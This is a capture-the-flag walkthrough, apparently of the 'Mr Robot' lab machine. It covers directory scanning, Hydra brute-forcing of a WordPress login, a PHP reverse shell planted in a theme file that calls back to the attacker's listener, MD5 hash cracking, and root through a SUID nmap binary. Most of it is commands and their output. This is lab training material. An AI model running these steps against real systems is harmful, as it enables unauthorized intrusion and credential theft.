scanned in 29.23 secondsThere are three ports open: 22(SSH), 80(http), 443(https), let’s navigate to port 80 and see what’s there, but before that, let’s run a Gobuster directory scan on the target using this command: gobuster dir -w /usr/share/wordlists/dirb/common.txt -u {target_IP}GobusterWhen we visit the website, we see some cool stuff going on. Unfortunately, there is nothing useful for us there, let’s take a look at what Gobuster found for us:$ gobuster dir -w /usr/share/wordlists/dirb/common.txt -u http://10.10.117.187===============================================================Gobuster v3.1.0by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)===============================================================[+] Url: http://10.10.117.187[+] Method: GET[+] Threads: 10[+] Wordlist: /usr/share/wordlists/dirb/common.txt[+] Negative Status codes: 404[+] User Agent: gobuster/3.1.0[+] Timeout: 10s===============================================================2021/12/21 05:56:02 Starting gobuster in directory enumeration mode===============================================================/.hta (Status: 403) [Size: 213]/.htaccess (Status: 403) [Size: 218]/.htpasswd (Status: 403) [Size: 218]/0 (Status: 301) [Size: 0] [--&gt; http://10.10.117.187/0/]/admin (Status: 301) [Size: 235] [--&gt; http://10.10.117.187/admin/]/atom (Status: 301) [Size: 0] [--&gt; http://10.10.117.187/feed/atom/]/audio (Status: 301) [Size: 235] [--&gt; http://10.10.117.187/audio/] /blog (Status: 301) [Size: 234] [--&gt; http://10.10.117.187/blog/] /css (Status: 301) [Size: 233] [--&gt; http://10.10.117.187/css/] /dashboard (Status: 302) [Size: 0] [--&gt; http://10.10.117.187/wp-admin/]/favicon.ico (Status: 200) [Size: 0] /feed (Status: 301) [Size: 0] [--&gt; http://10.10.117.187/feed/] /image (Status: 301) [Size: 0] [--&gt; http://10.10.117.187/image/] /Image (Status: 301) [Size: 0] [--&gt; http://10.10.117.187/Image/] /images (Status: 301) [Size: 236] [--&gt; http://10.10.117.187/images/]/index.html (Status: 200) [Size: 1188] /index.php (Status: 301) [Size: 0] [--&gt; http://10.10.117.187/] /intro (Status: 200) [Size: 516314] /js (Status: 301) [Size: 232] [--&gt; http://10.10.117.187/js/] /license (Status: 200) [Size: 309] /login (Status: 302) [Size: 0] [--&gt; http://10.10.117.187/wp-login.php]/page1 (Status: 301) [Size: 0] [--&gt; http://10.10.117.187/] /phpmyadmin (Status: 403) [Size: 94] /rdf (Status: 301) [Size: 0] [--&gt; http://10.10.117.187/feed/rdf/] /readme (Status: 200) [Size: 64] /robots (Status: 200) [Size: 41] /robots.txt (Status: 200) [Size: 41] /rss (Status: 301) [Size: 0] [--&gt; http://10.10.117.187/feed/] /rss2 (Status: 301) [Size: 0] [--&gt; http://10.10.117.187/feed/] /sitemap (Status: 200) [Size: 0] /sitemap.xml (Status: 200) [Size: 0] /video (Status: 301) [Size: 235] [--&gt; http://10.10.117.187/video/] /wp-admin (Status: 301) [Size: 238] [--&gt; http://10.10.117.187/wp-admin/]/wp-content (Status: 301) [Size: 240] [--&gt; http://10.10.117.187/wp-content/]/wp-config (Status: 200) [Size: 0] /wp-cron (Status: 200) [Size: 0] /wp-includes (Status: 301) [Size: 241] [--&gt; http://10.10.117.187/wp-includes/]/wp-load (Status: 200) [Size: 0] /wp-links-opml (Status: 200) [Size: 227] /wp-login (Status: 200) [Size: 2613] /wp-mail (Status: 500) [Size: 3064] /wp-settings (Status: 500) [Size: 0] /wp-signup (Status: 302) [Size: 0] [--&gt; http://10.10.117.187/wp-login.php?action=register]/xmlrpc (Status: 405) [Size: 42] /xmlrpc.php (Status: 405) [Size: 42] We can see that Gobuster has found robots.txt along with other files and directories. The robots.txt file is a document that tells search engines which pages they are and aren’t allowed to show on their search engine results or ban specific search engines from crawling the website altogether. Let’s take a look at robots.txt .Great! we found our first key, as well as fsocity.dic, the file contain a bunch of words in seperate lines, it seems that it is a wordlist, it contains more than 850k words, let’s remove repeated words using this commad: sort fsocity.dic | uniq &gt; sorted.dic . Let’s continue our enumeration, gobuster also found wp-login, let’s visit that page.As expected, it is a login page for wordpress, trying some default credentials only gets us ERROR: Invalid username, maybe if we submit a correct username we get something different. Using hydra, we can brute force the username with the wordlist we found earlier, but first lets look at the source code of the page.We can see that the method used to submit data is a POST request, with the username parameter “log” and password parameter “pwd”, with these information, we can now start hydra with the following command:hydra -L sorted.dic -p test {target_IP} http-post-form \"/wp-login.php:log=^USER^&amp;pwd=^PASS^:Invalid username\" $ hydra -L sorted.dic -p test 10.10.117.187 http-post-form \"/wp-login.php:log=^USER^&amp;pwd=^PASS^:Invalid username\"Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-21 09:01:17[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:11452/p:1), ~716 tries per task[DATA] attacking http-post-form://10.10.117.187:80/wp-login.php:log=^USER^&amp;pwd=^PASS^:Invalid username[STATUS] 1233.00 tries/min, 1233 tries in 00:01h, 10219 to do in 00:09h, 16 active[STATUS] 1235.67 tries/min, 3707 tries in 00:03h, 7745 to do in 00:07h, 16 active[80][http-post-form] host: 10.10.117.187 login: elliot password: test[80][http-post-form] host: 10.10.117.187 login: ELLIOT password: test[80][http-post-form] host: 10.10.117.187 login: Elliot password: testWe found our username, let’s now brute force the password using the same command but with some changes: $ hydra -l elliot -P sorted.dic 10.10.117.187 http-post-form \"/wp-login.php:log=^USER^&amp;pwd=^PASS^:The password you entered for the username\" $ hydra -l elliot -P sorted.dic 10.10.117.187 http-post-form \"/wp-login.php:log=^USER^&amp;pwd=^PASS^:The password you entered for the username\" 130 ⨯Hydra v9.2 (c) 2021 by van Hauser/THC &amp; David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2021-12-21 10:10:54[DATA] max 16 tasks per 1 server, overall 16 tasks, 11452 login tries (l:1/p:11452), ~716 tries per task[DATA] attacking http-post-form://10.10.117.187:80/wp-login.php:log=^USER^&amp;pwd=^PASS^:The password you entered for the username[STATUS] 1174.00 tries/min, 1174 tries in 00:01h, 10278 to do in 00:09h, 16 active[STATUS] 1169.67 tries/min, 3509 tries in 00:03h, 7943 to do in 00:07h, 16 active[80][http-post-form] host: 10.10.117.187 login: elliot password: 'redacted'1 of 1 target successfully completed, 1 valid password foundHydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2021-12-21 10:15:55Great, we got the password, now let’s login using the credentials we found.FootholdNow that we got access to wordpress account, i googled ‘wordpress reverse shell’ and found this useful article, it explains how we can get a reverse shell by injecting a malicious php code as a wordpress theme, for that i used pentestmonkey php reverse shell that you can find here, you have to change the ip in the code to your machine’s ip, and then set up a listener on your machine using the following command: nc -nlvp 1234.When you finish the setup, visit the page we have edited: http://{target_IP}/wp-content/themes/twentyfifteen/404.phpAnd just like that, we got a reverse shell! In order to have a functional shell though we can issue the following:$ nc -lnvp 1234listening on [any] 1234 ...connect to [10.11.31.131] from (UNKNOWN) [10.10.117.187] 51538Linux linux 3.13.0-55-generic #94-Ubuntu SMP Thu Jun 18 00:27:10 UTC 2015 x86_64 x86_64 x86_64 GNU/Linux15:21:18 up 5:21, 0 users, load average: 0.00, 0.01, 0.12USER TTY FROM LOGIN@ IDLE JCPU PCPU WHATuid=1(daemon) gid=1(daemon) groups=1(daemon)/bin/sh: 0: can't access tty; job control turned off$ python3 -c 'import pty;pty.spawn(\"/bin/bash\")'daemon@linux:/$ export TERM=xtermexport TERM=xtermdaemon@linux:/$ ^Z #pressed ctrl+zzsh: suspended nc -lnvp 1234$ stty raw -echo;fg 148 ⨯ 1 ⚙[1] + continued nc -lnvp 1234daemon@linux:/$Privelege EscalationrobotNavigating to /home/robot we find out 2nd key, but we can read it, there is also a file called password.raw-md5 and we can read it, i cracked it using crackstation and got robot’s password.Now let’s change the user using the command su robot and supplying the password we cracked.daemon@linux:/home/robot$ su robotPassword:robot@linux:~$ whoamirobotNow we can read our 2nd key.rootLet’s now upgrade to root and get the 3rd key.Before running any privilege escalation or enumeration script, let’s check the basic commands for elevatingprivileges like sudo and id :robot@linux:~$ sudo -l[sudo] password for robot:Sorry, user robot may not run sudo on linux.robot@linux:~$ iduid=1002(robot) gid=1002(robot) groups=1002(robot)robot@linux:~$We got nothing, let’s now look for some SUID binaries using:find / -type f -perm -04000 2&gt;/dev/nullrobot@linux:~$ find / -type f -perm -04000 2&gt;/dev/null/bin/ping/bin/umount/bin/mount/bin/ping6/bin/su/usr/bin/passwd/usr/bin/newgrp/usr/bin/chsh/usr/bin/chfn/usr/bin/gpasswd/usr/bin/sudo/usr/local/bin/nmap/usr/lib/openssh/ssh-keysign/usr/lib/eject/dmcrypt-get-device/usr/lib/vmware-tools/bin32/vmware-user-suid-wrapper/usr/lib/vmware-tools/bin64/vmware-user-suid-wrapper/usr/lib/pt_chownrobot@linux:~$We can use GTFOBins to check for possible vectors, and we see that nmap does not have SUID bit by default. Let’s use it to get root on the machine:robot@linux:~$ nmap --interactiveStarting nmap V. 3.81 ( http://www.insecure.org/nmap/ )Welcome to Interactive Mode -- press h &lt;enter&gt; for helpnmap&gt; !sh# whoamiroot# cd /root# lsfirstboot_done key-3-of-3.txtGreat, and just like that, we have rooted this machine, hope you enjoyed it, see you in the next machine." } ]
